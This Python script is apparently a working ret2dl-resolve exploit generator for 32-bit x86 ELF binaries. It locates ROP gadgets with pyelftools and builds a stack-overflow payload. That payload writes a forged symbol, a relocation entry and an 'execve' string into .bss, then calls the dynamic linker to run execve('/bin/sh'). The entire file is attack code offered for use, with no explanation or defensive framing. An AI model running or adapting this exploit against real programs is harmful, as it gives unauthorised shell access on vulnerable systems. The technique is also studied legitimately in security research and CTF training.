import sys
import json
import subprocess
from helper import *

import elftools.elf.structs
from elftools.elf.elffile import ELFFile
from elftools.elf.constants import P_FLAGS

class Config:
    __slots__ = "arch", "little", "pointer_size", "bss", "dynstr", "dynsym", \
                "relplt", "plt", "writemem", "write_size", "cleanup_gadget", \
                "cleanup_size", "sip_offset", "filler", "relocation_type"

config = Config()

def integer_to_bigendian(n):
    s = '%x' % n
    if len(s) & 1:
        s = '0' + s
    return s.decode('hex')

class Buffer:
    def __init__(self, start):
        self.start = start
        self.current = start
    def allocate(self, size, align_to=None, alignment=None):
        result = MemoryArea(self.current, size, align_to, alignment)
        self.current += result.size
        return result

def chunks(l, n):
    for i in xrange(0, len(l), n):
        yield l[i:i+n]

def ptr2str(integer):
    string = integer_to_bigendian(integer)
    if config.little:
        return string.rjust(config.pointer_size, "\x00")[::-1]
    else:
        return string.ljust(config.pointer_size, "\x00")

class MemoryArea:
    def __init__(self, start, size, align_to=None, alignment=None):
        if align_to is not None:
            alignment = size if (alignment is None) else alignment
            self.start = align(start, align_to, alignment)
            self.index = (self.start - align_to) / alignment
        else:
            self.start = start

        self.pointer = ptr2str(self.start)
        self.size = size
        self.end = self.start + self.size

    def write_string(self, string):
        string_len = len(string)
        if string_len > self.size:
            raise "You're trying to write {} bytes in a MemoryArea {} bytes wide".format(string_len, self.size)

        if string_len % config.write_size != 0:
            string = string.ljust(string_len + (config.write_size - string_len % config.write_size), "\0")
            string_len = len(string)

        result = ""
        for i, part in enumerate(chunks(string, config.write_size)):
            log(le2hex(part) + " " + str(len(part)))
            result += writemem(ptr2str(self.start + i * config.write_size), part)

        return result

    def write_pointer(self, pointer):
        return self.write_string(ptr2str(pointer))

def writemem(address, value):
    log("Writing " + str(list(value)) + " at " + le2hex(address))
    return call("writemem", [address, value])

def call(function_name, parameters):
    if len(parameters) > config.cleanup_size:
        raise "Too many parameters, find a better gadget"

    return ptr2str(getattr(config, function_name)) + \
           ptr2str(config.cleanup_gadget) + \
           "".join(map(str, parameters)) + \
           config.filler * (config.cleanup_size - len(parameters))

def align(address, base, of):
    offset = (address - base) % of
    return address if offset == 0 else address + 16 - offset

def hex_bytes(string):
    return "".join(map(lambda x: chr(int(x, 16)), filter(len, string.split(" "))))

binsh_str = "/bin/sh\0"
execve_str = "execve\0"

def find_string(sections, string):
    result = [section.header.p_vaddr + section.data().index(string) for section in sections if string in section.data()]
    if len(result) == 0:
        raise "Can't find gadget " + str(map(lambda char: hex(char)[2:], string))
    return result[0]

relocation_types = {
    "EM_386": 7
}

writemem_gadgets = {
    "EM_386": (hex_bytes(" 8b 54 24 08" + # mov    edx,DWORD PTR [esp+0x8] \
                         " 8b 44 24 04" + # mov    eax,DWORD PTR [esp+0x4] \
                         " 89 10"       + # mov    DWORD PTR [eax],edx \
                         " c3"),          # ret \
               4)
}

cleanup_gadgets = {
    "EM_386": (hex_bytes(" 5b" + # pop    ebx \
                         " 5e" + # pop    esi \
                         " 5f" + # pop    edi \
                         " 5d" + # pop    ebp \
                         " c3"), # ret
               4)
}

def config_from_elf(path):
    global config

    with open(path, "r") as executable_file:
        elf = ELFFile(executable_file)
        get_section = lambda name: filter(lambda section: section.name == name, elf.iter_sections())[0]

        # Binary type
        config.arch = elf.header.e_machine
        config.little = elf.little_endian
        config.pointer_size = elf.elfclass / 8

        # Useful sections
        config.bss = get_section(".bss").header.sh_addr
        config.dynstr = get_section(".dynstr").header.sh_addr
        config.dynsym = get_section(".dynsym").header.sh_addr
        config.relplt = get_section(".rel.plt").header.sh_addr
        config.plt = get_section(".plt").header.sh_addr

        # Gadgets
        writemem_gadget, config.write_size = writemem_gadgets[config.arch]
        executable_sections = filter(lambda segment: segment.header.p_flags  & P_FLAGS.PF_X, elf.iter_segments())
        config.writemem = find_string(executable_sections, writemem_gadget)

        cleanup_gadget, config.cleanup_size = cleanup_gadgets[config.arch]
        config.cleanup_gadget = find_string(executable_sections, cleanup_gadget)

        config.sip_offset = int(sys.argv[2])
        config.filler = ptr2str(reduce(lambda x,y: (x << 32) | 0xdeadb00b, xrange(1 + (config.pointer_size % 4)), 0))
        config.relocation_type = relocation_types[config.arch]

def main():
    global config

    executable_path = sys.argv[1]
    config_from_elf(executable_path)

    structs = elftools.elf.structs.ELFStructs(config.little, config.pointer_size * 8)

    buffer = Buffer(config.bss)
    relocation_target = buffer.allocate(config.pointer_size)
    pointer_to_null = buffer.allocate(config.pointer_size)
    binsh = buffer.allocate(len(binsh_str))
    execve_string = buffer.allocate(len(execve_str), config.dynstr, 1)
    symbol = buffer.allocate(structs.Elf_Sym.sizeof(), config.dynsym)
    log(hex(symbol.start))
    reloc = buffer.allocate(structs.Elf_Rel.sizeof(), config.relplt, 1)

    exploit = "A" * config.sip_offset

    # Pointer to NULL
    exploit += pointer_to_null.write_pointer(0)

    # /bin/sh
    exploit += binsh.write_string(binsh_str)

    # No versioning
    # edx + edi * 2
    exploit += writemem(ptr2str(0x80497e4), ptr2str(0x80482b0 - 2 * symbol.index + 2 * 2))

    # String
    exploit += execve_string.write_string(execve_str)

    # Symbol
    execve_symbol = structs.Elf_Sym.parse("\0" * structs.Elf_Sym.sizeof())
    execve_symbol.st_name = execve_string.index
    execve_symbol.st_info.bind = "STB_GLOBAL"
    execve_symbol.st_info.type = "STT_FUNC"

    exploit += symbol.write_string(structs.Elf_Sym.build(execve_symbol))

    # Relocation
    execve_reloc = structs.Elf_Rel.parse("\0" * structs.Elf_Rel.sizeof())
    execve_reloc.r_offset = relocation_target.start
    execve_reloc.r_info_type = config.relocation_type
    execve_reloc.r_info_sym = symbol.index
    execve_reloc.r_info = execve_reloc.r_info_type | (execve_reloc.r_info_sym << 8)

    log(str(list(structs.Elf_Rel.build(execve_reloc))))

    exploit += reloc.write_string(structs.Elf_Rel.build(execve_reloc))

    # Launch
    exploit += ptr2str(config.plt) + ptr2str(reloc.index)

    log("reloc.index " + hex(reloc.index))
    log("reloc.start " + hex(reloc.start))
    log("reloc.start " + hex(config.relplt))


    exploit += config.filler + binsh.pointer + pointer_to_null.pointer + pointer_to_null.pointer + ptr2str(4)

    write_string(exploit)

if __name__ == "__main__":
    main()
